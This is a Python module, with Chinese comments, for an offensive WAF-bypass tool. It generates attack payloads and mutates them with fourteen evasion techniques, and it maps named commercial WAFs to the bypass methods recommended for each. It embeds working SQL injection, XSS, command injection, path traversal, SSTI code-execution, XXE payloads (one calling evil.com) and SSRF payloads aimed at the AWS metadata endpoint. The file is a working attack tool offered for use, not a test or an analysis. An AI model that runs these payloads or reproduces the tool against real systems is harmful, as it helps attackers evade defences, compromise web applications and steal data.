#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""waf_detector/generator.py — WAF绕过Payload变异引擎

核心类 WAFPayloadGenerator 提供多种变异技术生成绕过 WAF 的攻击 payload。

14种变异技术:
    1.  comment_splitting      — 在SQL关键字间插入 /**/
    2.  case_mixing            — 随机大小写 (UnIoN SeLeCt)
    3.  url_encoding           — URL编码关键字
    4.  double_url_encoding    — 双重URL编码
    5.  html_entity_encoding   — HTML实体编码
    6.  unicode_encoding       — Unicode编码
    7.  null_byte_injection    — 插入空字节
    8.  newline_injection      — 插入换行符
    9.  tab_space_substitution — Tab替代空格
    10. inline_comment_nesting — 内联注释嵌套
    11. hpp                    — HTTP参数污染
    12. chunked_encoding       — 分块传输编码
    13. case_comment_combo     — 大小写+注释组合
    14. encoding_combo         — 多重编码组合

仅依赖 Python 标准库, 无需第三方包。

用法::

    gen = WAFPayloadGenerator()
    payloads = gen.generate("sqli", waf="cloudflare", count=20)
    mutations = gen.mutate("' OR '1'='1", techniques=["case_mixing", "url_encoding"])
    techniques = gen.get_techniques_for_waf("cloudflare")
"""

import html
import random
import re
import urllib.parse


# ========================================================================== #
#  常量定义
# ========================================================================== #

# SQL 关键字 (用于注释分割、大小写混合、内联注释嵌套)
SQL_KEYWORDS = [
    "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP",
    "FROM", "WHERE", "AND", "OR", "ORDER", "BY", "GROUP",
    "HAVING", "JOIN", "ON", "INTO", "VALUES", "TABLE",
    "DATABASE", "EXEC", "EXECUTE", "DECLARE", "CAST",
    "CONVERT", "CHAR", "VARCHAR", "NCHAR", "NVARCHAR",
    "CONCAT", "SUBSTRING", "EXTRACT", "COALESCE",
    "IF", "ELSE", "CASE", "WHEN", "THEN", "END",
    "LIMIT", "OFFSET", "AS", "DISTINCT", "ALL",
]

# 已知攻击类型
KNOWN_ATTACK_TYPES = {
    "sqli", "xss", "cmdi", "lfi", "ssti", "xxe", "rce",
    "ssrf", "sql", "command", "path", "template", "entity",
}

# 所有变异技术名称 (有序)
ALL_TECHNIQUES = [
    "comment_splitting",
    "case_mixing",
    "url_encoding",
    "double_url_encoding",
    "html_entity_encoding",
    "unicode_encoding",
    "null_byte_injection",
    "newline_injection",
    "tab_space_substitution",
    "inline_comment_nesting",
    "hpp",
    "chunked_encoding",
    "case_comment_combo",
    "encoding_combo",
]

# WAF → 推荐绕过技术映射 (部分匹配, 大小写不敏感)
WAF_TECHNIQUE_MAP: list[tuple[str, list[str]]] = [
    ("cloudflare", [
        "case_mixing", "comment_splitting", "unicode_encoding",
        "encoding_combo", "inline_comment_nesting",
    ]),
    ("aws", [
        "url_encoding", "double_url_encoding", "case_mixing",
        "html_entity_encoding",
    ]),
    ("akamai", [
        "url_encoding", "double_url_encoding", "case_mixing",
        "newline_injection",
    ]),
    ("imperva", [
        "hpp", "chunked_encoding", "case_comment_combo",
        "encoding_combo",
    ]),
    ("incapsula", [
        "hpp", "chunked_encoding", "case_comment_combo",
        "encoding_combo",
    ]),
    ("modsecurity", [
        "comment_splitting", "case_mixing", "inline_comment_nesting",
        "null_byte_injection",
    ]),
    ("f5", [
        "url_encoding", "double_url_encoding", "newline_injection",
        "tab_space_substitution",
    ]),
    ("sucuri", [
        "case_mixing", "comment_splitting", "encoding_combo",
        "unicode_encoding",
    ]),
    ("fortinet", [
        "comment_splitting", "case_mixing", "url_encoding",
    ]),
    ("barracuda", [
        "url_encoding", "double_url_encoding", "case_mixing",
    ]),
    ("radware", [
        "comment_splitting", "inline_comment_nesting", "case_mixing",
    ]),
    ("azure", [
        "url_encoding", "html_entity_encoding", "case_mixing",
    ]),
    ("fastly", [
        "case_mixing", "comment_splitting", "encoding_combo",
    ]),
    ("七牛云", ["url_encoding", "case_mixing", "comment_splitting"]),
    ("又拍云", ["url_encoding", "case_mixing", "comment_splitting"]),
    ("阿里云", ["case_mixing", "comment_splitting", "encoding_combo", "hpp"]),
    ("腾讯云", ["case_mixing", "comment_splitting", "encoding_combo", "hpp"]),
    ("华为云", ["url_encoding", "case_mixing", "comment_splitting"]),
    ("火山引擎", ["case_mixing", "comment_splitting", "encoding_combo"]),
    ("百度云", ["url_encoding", "case_mixing", "comment_splitting"]),
    ("360", ["url_encoding", "double_url_encoding", "case_mixing"]),
    ("安恒", ["comment_splitting", "case_mixing", "inline_comment_nesting"]),
    ("长亭", ["encoding_combo", "unicode_encoding", "case_comment_combo"]),
    ("深信服", ["comment_splitting", "case_mixing", "null_byte_injection"]),
    ("绿盟", ["url_encoding", "case_mixing", "comment_splitting"]),
    ("启明星辰", ["comment_splitting", "inline_comment_nesting", "case_mixing"]),
]

# 默认推荐技术 (未匹配到特定 WAF 时使用)
DEFAULT_TECHNIQUES = [
    "case_mixing", "comment_splitting", "url_encoding",
    "null_byte_injection", "encoding_combo",
]

# 各攻击类型的内置基础 payload
BASE_PAYLOADS: dict[str, list[dict]] = {
    "sqli": [
        {"payload": "' OR '1'='1' --", "technique": "classic", "description": "Classic SQL injection authentication bypass"},
        {"payload": "' UNION SELECT NULL,NULL --", "technique": "union", "description": "UNION-based SQL injection"},
        {"payload": "1; DROP TABLE users --", "technique": "stacked", "description": "Stacked query injection"},
        {"payload": "' AND SLEEP(5) --", "technique": "time_based", "description": "Time-based blind SQL injection"},
        {"payload": "admin'--", "technique": "comment", "description": "SQL comment injection"},
        {"payload": "' OR 1=1#", "technique": "or_true", "description": "OR-based authentication bypass"},
    ],
    "xss": [
        {"payload": "<script>alert(1)</script>", "technique": "classic", "description": "Classic XSS payload"},
        {"payload": "<img src=x onerror=alert(1)>", "technique": "event_handler", "description": "Event handler XSS"},
        {"payload": "\"><script>alert(1)</script>", "technique": "context_break", "description": "Context-breaking XSS"},
        {"payload": "javascript:alert(1)", "technique": "protocol", "description": "JavaScript protocol XSS"},
        {"payload": "<svg onload=alert(1)>", "technique": "svg", "description": "SVG-based XSS"},
        {"payload": "<body onload=alert(1)>", "technique": "body_event", "description": "Body event handler XSS"},
    ],
    "cmdi": [
        {"payload": "; cat /etc/passwd", "technique": "semicolon", "description": "Semicolon command injection"},
        {"payload": "| id", "technique": "pipe", "description": "Pipe command injection"},
        {"payload": "$(whoami)", "technique": "subshell", "description": "Subshell command injection"},
        {"payload": "`id`", "technique": "backtick", "description": "Backtick command injection"},
        {"payload": "&& dir", "technique": "and", "description": "AND command injection"},
        {"payload": "|| whoami", "technique": "or", "description": "OR command injection"},
    ],
    "lfi": [
        {"payload": "../../etc/passwd", "technique": "traversal", "description": "Path traversal"},
        {"payload": "....//....//etc/passwd", "technique": "double_dot", "description": "Double dot bypass"},
        {"payload": "/etc/passwd", "technique": "absolute", "description": "Absolute path"},
        {"payload": "php://filter/convert.base64-encode/resource=index.php", "technique": "wrapper", "description": "PHP wrapper"},
        {"payload": "..%252f..%252fetc/passwd", "technique": "encoding", "description": "Encoded traversal"},
    ],
    "ssti": [
        {"payload": "{{7*7}}", "technique": "jinja2", "description": "Jinja2 SSTI"},
        {"payload": "${7*7}", "technique": "el", "description": "EL expression SSTI"},
        {"payload": "#{7*7}", "technique": "ruby", "description": "Ruby ERB SSTI"},
        {"payload": "{{config}}", "technique": "config", "description": "Config extraction SSTI"},
        {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "technique": "rce", "description": "RCE via SSTI"},
    ],
    "xxe": [
        {"payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "technique": "classic", "description": "Classic XXE"},
        {"payload": "<!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">", "technique": "external", "description": "External DTD XXE"},
    ],
    "rce": [
        {"payload": "system('id')", "technique": "php_func", "description": "PHP function RCE"},
        {"payload": "os.system('id')", "technique": "python", "description": "Python RCE"},
        {"payload": "Runtime.getRuntime().exec('id')", "technique": "java", "description": "Java RCE"},
    ],
    "ssrf": [
        {"payload": "http://169.254.169.254/latest/meta-data/", "technique": "aws_metadata", "description": "AWS metadata SSRF"},
        {"payload": "http://localhost:8080/admin", "technique": "localhost", "description": "Localhost SSRF"},
        {"payload": "gopher://localhost:6379/_INFO", "technique": "gopher", "description": "Gopher protocol SSRF"},
    ],
}


# ========================================================================== #
#  WAF Payload 生成器
# ========================================================================== #

class WAFPayloadGenerator:
    """WAF 绕过 Payload 变异引擎。

    提供 14 种变异技术, 可针对特定 WAF 生成定制化绕过 payload。
    仅依赖 Python 标准库。

    用法::

        gen = WAFPayloadGenerator()

        # 生成 SQL 注入绕过 payload (针对 Cloudflare)
        payloads = gen.generate("sqli", waf="cloudflare", count=20)

        # 对指定 payload 应用变异
        mutations = gen.mutate("' OR '1'='1", techniques=["case_mixing"])

        # 获取 WAF 推荐技术
        techniques = gen.get_techniques_for_waf("cloudflare")
    """

    def __init__(self):
        """初始化 payload 生成器。"""
        self._rng = random.Random()

    # ------------------------------------------------------------------ #
    #  公共 API
    # ------------------------------------------------------------------ #

    def generate(self, *args, **kwargs) -> list:
        """生成绕过 payload。

        支持多种调用方式 (向后兼容):
            generate()                           — 使用默认参数
            generate(attack_type)                — 指定攻击类型
            generate(attack_type, waf)           — 指定攻击类型和 WAF
            generate(attack_type, waf, count)    — 指定攻击类型、WAF 和数量
            generate(waf_name="cf", attack_type="sqli") — 关键字参数

        Args:
            attack_type: 攻击类型 (sqli/xss/cmdi/lfi/ssti/xxe/rce/ssrf)
            waf:         目标 WAF 名称 (可选, 用于 WAF 针对性技术)
            waf_name:    waf 的别名 (兼容)
            count:       最大生成数量 (默认 10)

        Returns:
            payload 字符串列表
        """
        # 解析关键字参数
        attack_type = kwargs.get("attack_type")
        waf = kwargs.get("waf") or kwargs.get("waf_name")
        count = kwargs.get("count", 10)

        # 解析位置参数 — 智能判断每个参数是攻击类型、WAF名称还是数量
        for i, arg in enumerate(args):
            if isinstance(arg, int):
                count = arg
            elif isinstance(arg, str) and arg.lower() in KNOWN_ATTACK_TYPES:
                if attack_type is None:
                    attack_type = arg
            elif isinstance(arg, str):
                if waf is None:
                    waf = arg
                elif attack_type is None:
                    attack_type = arg

        if attack_type is None:
            attack_type = "sqli"
        if count is None or count <= 0:
            count = 10

        return self._do_generate(attack_type, waf, count)

    def _do_generate(self, attack_type: str, waf: str = None, count: int = 10) -> list:
        """实际生成逻辑 (内部方法)。"""
        attack_type = attack_type.lower() if attack_type else "sqli"
        results: list[str] = []
        seen: set[str] = set()

        # 收集基础 payload
        base_payloads: list[dict] = []
        builtins = BASE_PAYLOADS.get(attack_type, [])
        base_payloads.extend(builtins)

        # 尝试从 payloads 模块获取额外 payload
        try:
            from waf_detector.payloads import get_payloads
            module_payloads: list = []
            try:
                module_payloads = get_payloads(attack_type=attack_type, waf=waf) if waf else get_payloads(attack_type=attack_type)
            except TypeError:
                try:
                    module_payloads = get_payloads(attack_type)
                except TypeError:
                    try:
                        module_payloads = get_payloads()
                    except Exception:
                        module_payloads = []
            except Exception:
                module_payloads = []

            for p in module_payloads:
                if isinstance(p, dict):
                    base_payloads.append(p)
                elif isinstance(p, str):
                    base_payloads.append({"payload": p, "technique": "module", "description": ""})
        except ImportError:
            pass

        # 如果没有找到任何基础 payload, 使用通用 payload
        if not base_payloads:
            base_payloads = BASE_PAYLOADS.get("sqli", [])

        # 获取推荐技术
        techniques = self.get_techniques_for_waf(waf) if waf else list(ALL_TECHNIQUES)

        # 生成变异 payload
        for base in base_payloads:
            if len(results) >= count:
                break

            base_payload = base.get("payload", "") if isinstance(base, dict) else str(base)
            if not base_payload:
                continue

            # 添加原始 payload
            if base_payload not in seen:
                seen.add(base_payload)
                results.append(base_payload)
                if len(results) >= count:
                    break

            # 对每个技术应用变异
            for tech in techniques:
                if len(results) >= count:
                    break
                mutated = self._apply_technique(base_payload, tech)
                if mutated and mutated != base_payload and mutated not in seen:
                    seen.add(mutated)
                    results.append(mutated)

        return results[:count]

    def mutate(self, payload: str, techniques: list = None) -> list:
        """对给定 payload 应用变异技术。

        Args:
            payload:     基础 payload 字符串
            techniques:  要应用的技术列表 (None = 应用所有技术)

        Returns:
            变异后的 payload 字符串列表
        """
        if not payload:
            return []

        if techniques is None:
            techniques = list(ALL_TECHNIQUES)

        results: list[str] = []
        seen: set[str] = set()

        for tech in techniques:
            mutated = self._apply_technique(payload, tech)
            if mutated and mutated != payload and mutated not in seen:
                seen.add(mutated)
                results.append(mutated)

        return results

    def get_techniques_for_waf(self, waf: str) -> list:
        """获取指定 WAF 推荐的绕过技术。

        Args:
            waf: WAF 名称 (大小写不敏感, 支持部分匹配)

        Returns:
            推荐技术名称列表
        """
        if not waf:
            return list(DEFAULT_TECHNIQUES)

        waf_lower = waf.lower()

        # 尝试部分匹配
        for keyword, techniques in WAF_TECHNIQUE_MAP:
            if keyword.lower() in waf_lower or waf_lower in keyword.lower():
                return list(techniques)

        return list(DEFAULT_TECHNIQUES)

    # ------------------------------------------------------------------ #
    #  变异技术分发
    # ------------------------------------------------------------------ #

    def _apply_technique(self, payload: str, technique: str) -> str:
        """应用单个变异技术到 payload。

        通过反射调用 ``_mutate_<technique>`` 方法。
        """
        method = getattr(self, f"_mutate_{technique}", None)
        if method is None:
            return payload
        try:
            return method(payload)
        except Exception:
            return payload

    # ------------------------------------------------------------------ #
    #  14 种变异技术实现
    # ------------------------------------------------------------------ #

    def _mutate_comment_splitting(self, payload: str) -> str:
        """技术1: 注释分割 — 在SQL关键字间插入 /**/。"""
        result = payload
        for kw in SQL_KEYWORDS:
            pattern = re.compile(r"\b(" + kw + r")\b", re.I)

            def _replacer(m: re.Match) -> str:
                return f"/**/{m.group(1)}/**/"

            result = pattern.sub(_replacer, result)
        return result

    def _mutate_case_mixing(self, payload: str) -> str:
        """技术2: 大小写混合 — 随机大小写 (UnIoN SeLeCt)。"""
        result: list[str] = []
        upper = True
        for ch in payload:
            if ch.isalpha():
                result.append(ch.upper() if upper else ch.lower())
                upper = not upper
            else:
                result.append(ch)
        return "".join(result)

    def _mutate_url_encoding(self, payload: str) -> str:
        """技术3: URL编码 — 对 payload 进行 URL 编码。"""
        return urllib.parse.quote(payload, safe="")

    def _mutate_double_url_encoding(self, payload: str) -> str:
        """技术4: 双重URL编码 — 对 payload 进行两次 URL 编码。"""
        once = urllib.parse.quote(payload, safe="")
        return urllib.parse.quote(once, safe="")

    def _mutate_html_entity_encoding(self, payload: str) -> str:
        """技术5: HTML实体编码 — 将特殊字符转为 HTML 实体。"""
        result: list[str] = []
        for ch in payload:
            if ch.isalnum() or ch.isspace():
                result.append(ch)
            else:
                result.append(f"&#{ord(ch)};")
        return "".join(result)

    def _mutate_unicode_encoding(self, payload: str) -> str:
        """技术6: Unicode编码 — 将特殊字符转为 Unicode 转义。"""
        result: list[str] = []
        for ch in payload:
            if ch.isalnum() or ch.isspace():
                result.append(ch)
            else:
                result.append(f"\\u{ord(ch):04x}")
        return "".join(result)

    def _mutate_null_byte_injection(self, payload: str) -> str:
        """技术7: 空字节注入 — 在 payload 中插入空字节。"""
        if len(payload) > 2:
            mid = len(payload) // 2
            return payload[:mid] + "%00" + payload[mid:]
        return "%00" + payload

    def _mutate_newline_injection(self, payload: str) -> str:
        """技术8: 换行注入 — 用换行符替代空格。"""
        result = payload.replace(" ", "\n")
        if result == payload:
            result = payload.replace(" ", "%0a")
        return result

    def _mutate_tab_space_substitution(self, payload: str) -> str:
        """技术9: Tab替代空格 — 用 Tab 替代空格。"""
        return payload.replace(" ", "\t")

    def _mutate_inline_comment_nesting(self, payload: str) -> str:
        """技术10: 内联注释嵌套 — 在SQL关键字内部插入注释。"""
        result = payload
        for kw in ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE", "AND", "OR"]:
            pattern = re.compile(r"\b(" + kw + r")\b", re.I)

            def _make_replacer():
                def _replacer(m: re.Match) -> str:
                    word = m.group(1)
                    mid = len(word) // 2
                    if mid > 0:
                        return word[:mid] + "/**/" + word[mid:]
                    return word
                return _replacer

            result = pattern.sub(_make_replacer(), result)
        return result

    def _mutate_hpp(self, payload: str) -> str:
        """技术11: HTTP参数污染 — 重复参数以混淆 WAF。"""
        if "=" in payload:
            parts = payload.split("=", 1)
            param = parts[0]
            value = parts[1] if len(parts) > 1 else ""
            # HPP: 同名参数发送两次, WAF 可能只检查第一个
            return f"{param}={value}&{param}={value}"
        return payload + "&" + payload

    def _mutate_chunked_encoding(self, payload: str) -> str:
        """技术12: 分块传输编码 — 模拟 chunked 编码分割 payload。"""
        if not payload:
            return payload
        chunks: list[str] = []
        chunk_size = max(1, len(payload) // 3)
        for i in range(0, len(payload), chunk_size):
            chunk = payload[i:i + chunk_size]
            chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
        chunks.append("0\r\n\r\n")
        return "".join(chunks)

    def _mutate_case_comment_combo(self, payload: str) -> str:
        """技术13: 大小写+注释组合 — 先大小写混合再注释分割。"""
        case_mixed = self._mutate_case_mixing(payload)
        return self._mutate_comment_splitting(case_mixed)

    def _mutate_encoding_combo(self, payload: str) -> str:
        """技术14: 多重编码组合 — URL编码后再HTML实体编码。"""
        url_encoded = self._mutate_url_encoding(payload)
        return self._mutate_html_entity_encoding(url_encoded)


# ========================================================================== #
#  模块自测试
# ========================================================================== #

if __name__ == "__main__":
    gen = WAFPayloadGenerator()

    print("=" * 60)
    print("WAF Payload 变异引擎 — 自测试")
    print("=" * 60)

    # 测试 generate
    print("\n[1] generate('sqli', waf='cloudflare', count=10):")
    payloads = gen.generate("sqli", waf="cloudflare", count=10)
    for i, p in enumerate(payloads, 1):
        print(f"  {i:2d}. {p}")

    # 测试 mutate
    print("\n[2] mutate(\"' OR '1'='1\"):")
    mutations = gen.mutate("' OR '1'='1")
    for i, m in enumerate(mutations, 1):
        print(f"  {i:2d}. {m}")

    # 测试 get_techniques_for_waf
    print("\n[3] get_techniques_for_waf('cloudflare'):")
    techniques = gen.get_techniques_for_waf("cloudflare")
    for t in techniques:
        print(f"  - {t}")

    # 测试无参数调用
    print("\n[4] generate() (无参数):")
    default_payloads = gen.generate()
    print(f"  生成了 {len(default_payloads)} 个 payload")
    for p in default_payloads[:3]:
        print(f"  - {p}")
